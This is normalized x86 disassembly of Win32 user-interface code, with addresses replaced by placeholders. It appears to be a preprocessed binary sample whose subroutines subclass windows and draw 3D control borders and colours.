test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
je r-xdata
sub_438410
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov edi [ esp + 0x14 ]
test edi edi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
cmp edi 0x6
jg r-xdata
mov esi [ esp + 0x10 ]
push esi
call sub_4379b0
add esp 0x4
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov ebx eax
push esi
call [ GetParent@IAT ]
push eax
push 0x0
push 0xffff
mov eax edi
shl eax 0x5
push ebx
push esi
call [ eax + r--data ]
add esp 0x14
cmp eax 0x1
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
mov eax 0x1
pop edi
pop esi
pop ebx
retn 0x8
lea eax [ edi + edi * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_437a20
add esp 0x8
sub_4384a0
sub esp 0x4
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
call sub_4379b0
add esp 0x4
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push esi
call sub_4395b0
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x4
retn
pop edi
pop esi
pop ebx
add esp 0x4
retn
lea ebx [ esp + 0xc ]
mov edi [ SendMessageA@IAT ]
mov [ esp + 0xc ] 0x29a
push ebx
push 0x0
push 0x1944
push esi
call edi
cmp [ esp + 0xc ] 0x29a
jne r-xdata
push ebx
push 0x0
push 0x1943
push esi
call edi
cmp [ esp + 0xc ] 0x29a
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ RemovePropA@IAT ]
mov ax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
push ecx
push 0x0
push eax
push esi
call sub_4395b0
add esp 0x10
sub_438550
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x5
push eax
mov ebp [ GetWindow@IAT ]
call ebp
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov si [ esp + 0x18 ]
push 0x2
push edi
call ebp
mov edi eax
test edi edi
jne r-xdata
push edi
push esi
push ebx
call sub_4384a0
add esp 0xc
push 0x2
push ebx
call ebp
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push esi
push edi
call sub_4384a0
add esp 0xc
push 0x5
push edi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
sub_4385d0
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov edi [ esp + 0x14 ]
push 0x5
push edi
mov esi [ GetWindow@IAT ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
push sub_438eb0
push edi
call sub_437a20
add esp 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov bp [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push ebx
call sub_4395b0
add esp 0x10
push 0x2
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
sub_438640
cmp [ rw-data ] 0x0
push esi
je r-xdata
xor eax eax
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
cmp eax 0x134
jb r-xdata
cmp eax 0x137
je r-xdata
cmp eax 0x134
jne r-xdata
mov esi [ esp + 0xc ]
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov ecx [ rw-data ]
push ecx
push esi
call [ SetBkColor@IAT ]
mov eax [ rw-data ]
pop esi
retn 0xc
cmp [ rw-data ] 0x35f
jae r-xdata
xor eax eax
pop esi
retn 0xc
mov esi [ esp + 0x10 ]
push 0x5
push esi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
and al 0x3
cmp al 0x3
jne r-xdata
sub_438700
sub esp 0x3c
cmp [ esp + 0x50 ] 0x0
push ebx
push esi
push edi
push ebp
je r-xdata
mov esi [ esp + 0x50 ]
push 0x6
push esi
call sub_4379d0
add esp 0x8
xor eax eax
mov esi [ esp + 0x50 ]
jmp r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x58 ]
push eax
push edx
push esi
call [ DefWindowProcA@IAT ]
mov edx [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x5c ]
test eax eax
push ecx
je r-xdata
push esi
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
cmp [ rw-data ] 0x0
mov [ esp + 0x10 ] eax
jne r-xdata
mov [ esp + 0x14 ] 0x1
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x11ef
push esi
call [ SendMessageA@IAT ]
push 0xfffffff0
mov ebp [ GetWindowLongA@IAT ]
push esi
call ebp
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
mov ecx eax
and ecx 0x10400080
cmp ecx 0x10400080
jne r-xdata
and eax 0xc00000
mov ebx [ rw-data ]
sub eax 0xc00000
cmp eax 0x1
push esi
sbb ebp ebp
neg ebp
cmp ebp 0x1
sbb eax eax
inc eax
sub ebx eax
call [ GetWindowDC@IAT ]
mov edi eax
lea eax [ esp + 0x1c ]
push eax
push esi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
sub [ esp + 0x24 ] ecx
push 0xf
lea eax [ esp + 0x20 ]
push 0x7
sub [ esp + 0x30 ] edx
push 0x2
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x28 ] 0x0
push eax
push edi
call sub_437ce0
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
lea ecx [ esp + 0x1c ]
push 0xf
push 0x2
push 0x0
push ecx
push edi
call sub_437ce0
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
mov ecx [ rw-data ]
push ecx
push edi
call [ SelectObject@IAT ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x1c ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
push ecx
push edi
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x24 ]
add eax [ rw-data ]
mov [ esp + 0x3c ] eax
call sub_437cb0
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
sub eax [ esp + 0x24 ]
add esp 0x8
sub eax [ rw-data ]
push 0x0
push eax
push ecx
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x2c ]
push ecx
push edi
call sub_437cb0
mov eax [ esp + 0x24 ]
add esp 0x8
add eax [ rw-data ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x24 ]
sub eax [ rw-data ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x34 ] eax
push ecx
mov eax [ esp + 0x34 ]
push edi
add eax ebx
mov [ esp + 0x40 ] eax
call sub_437cb0
add esp 0x8
test ebp ebp
je r-xdata
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x2c ]
sub eax [ esp + 0x20 ]
push ecx
sub eax [ rw-data ]
push edi
add [ esp + 0x38 ] eax
mov eax [ esp + 0x38 ]
add eax [ rw-data ]
mov [ esp + 0x40 ] eax
call sub_437cb0
mov ecx [ esp + 0x20 ]
add esp 0x8
push ecx
push edi
call [ SelectObject@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
mov ebp [ esp + 0x30 ]
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x3c ]
mov eax [ edx ]
add ebx [ esp + 0x30 ]
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x4 ] ebp
mov edx [ edx + 0xc ]
mov [ ecx + 0x8 ] eax
mov eax [ rw-data ]
push 0xf
add eax ebx
push 0x0
push 0x2
mov [ ecx + 0xc ] edx
lea ecx [ esp + 0x48 ]
mov [ esp + 0x4c ] ebx
mov [ esp + 0x54 ] eax
push ecx
push edi
call sub_437ce0
add esp 0x14
sub_4389b0
sub esp 0xc
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
add esp 0xc
retn
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x8 ]
push 0x9
push eax
mov esi [ GetProfileStringA@IAT ]
mov [ rw-data ] 0x1e
push rw-data
push rw-data
push rw-data
call esi
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
mov edi [ lstrcmpiA@IAT ]
call edi
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x9
push eax
push rw-data
push rw-data
push rw-data
call esi
lea eax [ esp + 0x8 ]
push rw-data
push eax
call edi
test eax eax
jne r-xdata
mov [ rw-data ] 0x1f
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ rw-data ] 0x1f
sub_438a50
sub esp 0x28
push ebx
push esi
push edi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x0
call [ GetDC@IAT ]
mov ebx eax
push 0xc
push ebx
mov esi [ GetDeviceCaps@IAT ]
call esi
mov edi eax
push 0xe
push ebx
call esi
imul edi eax
mov eax 0x1
cmp edi 0x4
jge r-xdata
push 0x1
mov edi [ GetSystemMetrics@IAT ]
mov [ rw-data ] eax
call edi
cmp eax 0x15e
jne r-xdata
xor eax eax
push ebx
push 0x0
call [ ReleaseDC@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
call edi
cmp eax 0x280
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ rw-data ]
pop edi
pop esi
pop ebx
add esp 0x28
retn
push rw-data
mov esi [ GlobalAddAtomA@IAT ]
call esi
mov [ rw-data ] ax
test ax ax
jne r-xdata
mov [ rw-data ] 0x0
push rw-data
call esi
mov [ rw-data ] ax
test ax ax
je r-xdata
mov [ rw-data ] 0x0
push rw-data
call esi
mov [ rw-data ] ax
push rw-data
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] ax
je r-xdata
xor eax eax
pop edi
mov [ rw-data ] 0x0
pop esi
pop ebx
add esp 0x28
retn
test ax ax
je r-xdata
push rw-data
call esi
mov [ rw-data ] ax
push rw-data
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] ax
je r-xdata
xor eax eax
pop edi
mov [ rw-data ] 0x0
pop esi
pop ebx
add esp 0x28
retn
test ax ax
je r-xdata
push rw-data
call esi
mov [ rw-data ] ax
test ax ax
je r-xdata
push 0x2a
call edi
mov [ rw-data ] al
call sub_4389b0
push 0x1
call sub_438d20
add esp 0x4
test eax eax
je r-xdata
mov ebx rw-data
mov esi r--data
mov edi [ GetClassInfoA@IAT ]
mov eax [ esi ]
lea edx [ esi - 0x14 ]
mov [ ebx ] eax
lea ecx [ esp + 0xc ]
push ecx
add ebx 0x18
push edx
add esi 0x20
push 0x0
call edi
mov ecx [ esp + 0x10 ]
cmp esi r--data
mov [ ebx - 0x14 ] ecx
jb r-xdata
lea eax [ esp + 0xc ]
push eax
push 0x8002
push 0x0
call edi
test eax eax
je r-xdata
mov eax [ DefDlgProcA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
jmp r-xdata
sub_438c40
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax rw-data
add eax 0x18
cmp eax rw-data
jb r-xdata
mov [ eax ] 0x0
cmp [ eax ] 0x0
je r-xdata
call sub_437c80
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ GlobalDeleteAtom@IAT ]
mov ax [ rw-data ]
mov esi [ GlobalDeleteAtom@IAT ]
push eax
call esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
mov [ rw-data ] 0x0
push rw-data
call [ LeaveCriticalSection@IAT ]
pop esi
retn
mov ax [ rw-data ]
push eax
call esi
sub_438d20
sub esp 0x30
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor si si
mov ebx [ GetSysColor@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x30
retn
movzx edi si
inc si
xor eax eax
mov ax [ edi * 2 + r--data ]
push eax
call ebx
cmp si 0x8
mov [ esp + edi * 4 + 0x1c ] eax
jb r-xdata
cmp [ rw-data ] 0x300
jne r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
mov [ esp + 0x1c ] 0xffffff
cmp [ esp + 0x20 ] 0x808080
mov [ esp + 0x34 ] 0xc0c0c0
je r-xdata
mov eax [ esp + 0x34 ]
cmp [ esp + 0x20 ] eax
jne r-xdata
cmp [ esp + 0x40 ] 0x0
jne r-xdata
mov [ esp + 0x34 ] 0x808080
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x3c ]
push eax
push ecx
mov eax [ rw-data ]
xor si si
push edx
push 0x67c7
push eax
call sub_43af50
mov edi [ CreateSolidBrush@IAT ]
mov [ esp + 0xc ] eax
mov esi rw-data
lea edi [ esp + 0x1c ]
mov ecx 0x20
[ esi ] [ edi ]
jne r-xdata
movzx eax si
inc si
mov ecx [ esp + eax * 4 + 0x1c ]
lea ebx [ eax * 4 ]
push ecx
call edi
cmp si 0x3
mov [ esp + ebx + 0x10 ] eax
jb r-xdata
xor eax eax
xor ecx ecx
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x30
retn
xor si si
inc ax
cmp ax 0x3
jb r-xdata
movzx eax si
inc si
lea ecx [ esp + eax * 4 + 0x10 ]
push ecx
call sub_437c60
add esp 0x4
cmp si 0x3
jb r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_437c60
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x30
retn
movzx edx ax
cmp [ esp + edx * 4 + 0x10 ] ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
call sub_437c80
mov ebx [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
mov edx rw-data
lea esi [ esp + 0x1c ]
mov eax [ ecx ]
mov edi rw-data
mov ecx [ ecx + 0x8 ]
mov [ edx ] eax
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] ecx
mov ecx 0x8
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop edi
pop esi
mov [ rw-data ] eax
mov eax 0x1
pop ebx
add esp 0x30
retn
sub_438eb0
sub esp 0x18
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x30 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x2c ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov ebp [ esp + 0x38 ]
push 0x6
mov ebx [ esp + 0x38 ]
push ebp
mov esi [ esp + 0x34 ]
push ebx
push edi
push esi
call sub_437c00
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp edi 0x86
ja r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp edi 0x138
ja r-xdata
cmp edi 0x85
jae r-xdata
cmp edi 0x1943
jb r-xdata
cmp edi 0x132
jae r-xdata
cmp [ rw-data ] 0x35f
jae r-xdata
cmp edi 0xc
je r-xdata
mov ebx [ esp + 0x34 ]
mov ebp [ esp + 0x38 ]
cmp edi 0x1944
jbe r-xdata
lea eax [ esp + 0x18 ]
push 0x10
push eax
push esi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
cmp edi 0x110
je r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
push esi
call [ IsIconic@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x38 ]
mov eax 0x3ee
mov [ ebp ] 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp r-xdata
push 0x4
push esi
call [ GetWindowLongA@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
push 0x6
push esi
call sub_4379d0
mov [ esp + 0x1c ] eax
add esp 0x8
cmp [ rw-data ] 0x35f
jb r-xdata
jmp r-xdata
mov ebp [ esp + 0x38 ]
push 0x0
mov ebx [ esp + 0x38 ]
push ebp
push ebx
push edi
push esi
call sub_438700
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp eax 0xffff0000
jbe r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
jmp r-xdata
push ebp
cmp eax 0x1
jne r-xdata
mov [ esp + 0x10 ] 0x1
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] 0x0
test al 0x4
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x30a
ja r-xdata
push ebx
push edi
call sub_438640
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
test eax eax
je r-xdata
jmp r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
cmp [ rw-data ] 0x35f
mov edi eax
jb r-xdata
push esi
call sub_438300
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x11f0
push esi
call [ SendMessageA@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
push 0xffff
push esi
call sub_438550
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test al 0x4
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp r-xdata
sub_4391e0
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4379b0
add esp 0x4
test eax eax
jne r-xdata
cmp [ rw-data ] 0x35f
jb r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test al 0x4
je r-xdata
xor eax eax
pop esi
retn
sub_439220
sub esp 0x4
push ebx
push esi
push edi
push ebp
call [ GetCurrentThreadId@IAT ]
mov esi eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] esi
je r-xdata
mov edi [ rw-data ]
push rw-data
call [ LeaveCriticalSection@IAT ]
mov esi [ esp + 0x18 ]
mov ebx [ esp + 0x20 ]
cmp esi 0x3
jne r-xdata
xor ecx ecx
cmp ecx [ rw-data ]
jge r-xdata
shl edi 0x2
push ebx
mov eax [ esp + 0x20 ]
mov ecx [ edi + edi * 4 + rw-data ]
push eax
push esi
push ecx
call [ CallNextHookEx@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0xc
mov ebp [ ebx ]
cmp [ ebp + 0x28 ] 0x8002
jne r-xdata
jne r-xdata
mov eax rw-data
lea eax [ edi * 4 ]
test [ eax + eax * 4 + rw-data ] 0x1
je r-xdata
cmp [ rw-data ] 0x20
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
push ebx
push eax
push esi
push 0x0
call [ CallNextHookEx@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0xc
mov [ rw-data ] ecx
mov [ rw-data ] esi
add eax 0x14
inc ecx
cmp ecx [ rw-data ]
jl r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_4391e0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push sub_438eb0
push eax
call sub_437bc0
add esp 0x8
jmp r-xdata
cmp [ rw-data ] 0x35f
jb r-xdata
cmp [ eax ] esi
je r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esp + 0x1c ]
push eax
push 0x1
push 0xffff
push ecx
call sub_4395b0
add esp 0x10
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x1c ]
push 0xfffffff0
push eax
mov ebp [ GetWindowLongA@IAT ]
call ebp
mov [ esp + 0x10 ] 0x0
test al 0x4
jne r-xdata
cmp ecx [ rw-data ]
cmp [ rw-data ] 0x18
je r-xdata
push sub_438eb0
push ebp
call sub_437a20
add esp 0x8
jmp r-xdata
mov ebp [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x11f0
push ebp
call [ SendMessageA@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
push eax
call [ GetParent@IAT ]
push eax
call sub_4391e0
add esp 0x4
test eax eax
je r-xdata
sub_439400
sub esp 0x10
cmp [ rw-data ] 0x35f
jb r-xdata
mov eax 0x1
add esp 0x10
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea ecx [ esp ]
push 0x10
push ecx
push eax
call [ GetClassNameA@IAT ]
lea ecx [ esp ]
push r--data
push ecx
call [ lstrcmpA@IAT ]
cmp eax 0x1
sbb eax eax
add esp 0x10
inc eax
retn
sub_439450
cmp [ rw-data ] 0x35f
jb r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov eax [ esp + 0x14 ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
and eax 0x3
cmp eax 0x2
je r-xdata
xor eax eax
retn
cmp eax 0x3
je r-xdata
mov eax 0x1
retn
sub_439490
cmp [ rw-data ] 0x35f
push ebx
push esi
push edi
push ebp
jb r-xdata
mov eax [ esp + 0x18 ]
and eax 0x3
cmp eax 0x2
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov bx [ esp + 0x20 ]
cmp bx 0x1
jne r-xdata
mov bx [ esp + 0x20 ]
cmp bx 0x1
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
push 0x5
push edi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
push 0x5
push edi
mov esi [ GetWindow@IAT ]
call esi
mov ebp eax
test ebp ebp
je r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x4
push eax
call sub_4395b0
add esp 0x10
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x2
push ebp
call sub_4395b0
add esp 0x10
push 0x2
push ebp
call esi
test eax eax
je r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push ebx
push 0x4
push eax
call sub_4395b0
add esp 0x10
sub_439560
mov eax [ esp + 0x8 ]
and ax 0x1f
movzx ecx ax
cmp ecx 0x3
je r-xdata
xor eax eax
retn
mov ax [ esp + 0xc ]
test al 0x10
je r-xdata
test al 0x20
je r-xdata
cmp ecx 0x2
jle r-xdata
cmp ecx 0x4
jl r-xdata
mov eax 0x1
retn
cmp ecx 0xc
je r-xdata
cmp [ rw-data ] 0x35f
jae r-xdata
cmp ecx 0x9
jle r-xdata
cmp ecx 0x10
jl r-xdata
cmp ecx 0x12
jg r-xdata
sub_4395b0
sub esp 0x10
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
push ebp
push esi
call sub_4379b0
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x10
push eax
xor ebp ebp
push esi
mov ebx r--data
call [ GetClassNameA@IAT ]
mov di [ esp + 0x28 ]
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
add ebx 0x20
inc ebp
cmp ebx r--data
jb r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ ebx - 0x1c ]
push eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
test [ ebx ] di
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov bx [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
push ecx
push ebx
push edi
push eax
push esi
mov eax ebp
shl eax 0x5
call [ eax + r--data ]
add esp 0x14
mov edi eax
cmp edi 0x1
jne r-xdata
sbb eax eax
pop ebp
inc eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
cmp bx 0x1
jne r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_437a20
add esp 0x8
cmp edi 0x1
cmp [ rw-data ] 0x10
jne r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_437bc0
add esp 0x8
cmp edi 0x1
sbb eax eax
pop ebp
inc eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
sub_4396a0
sub esp 0x10
lea eax [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
push eax
push edi
call [ GetWindowRect@IAT ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
mov esi eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push 0x1
push 0x1
push eax
call [ InflateRect@IAT ]
push edi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
test esi 0x200000
je r-xdata
mov ecx [ eax + 0x18 ]
test cl 0xc0
jne r-xdata
lea eax [ esp + 0xc ]
push 0x0
push eax
push edi
call [ InvalidateRect@IAT ]
inc [ esp + 0x14 ]
and cl 0x3
cmp cl 0x2
jne r-xdata
test cl 0x2
je r-xdata
mov ecx [ esp + 0x14 ]
sub ecx [ eax + 0x10 ]
cmp ecx [ esp + 0xc ]
jne r-xdata
test cl 0x1
jne r-xdata
mov eax [ eax + 0x14 ]
mov ecx [ esp + 0x18 ]
sub ecx [ esp + 0x10 ]
cmp ecx eax
jl r-xdata
inc eax
add [ esp + 0x10 ] eax
sub_439760
sub esp 0x10
push ebx
push esi
push edi
push 0xfffffff0
mov edi [ esp + 0x24 ]
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
lea eax [ esp + 0xc ]
push eax
push edi
call [ GetWindowRect@IAT ]
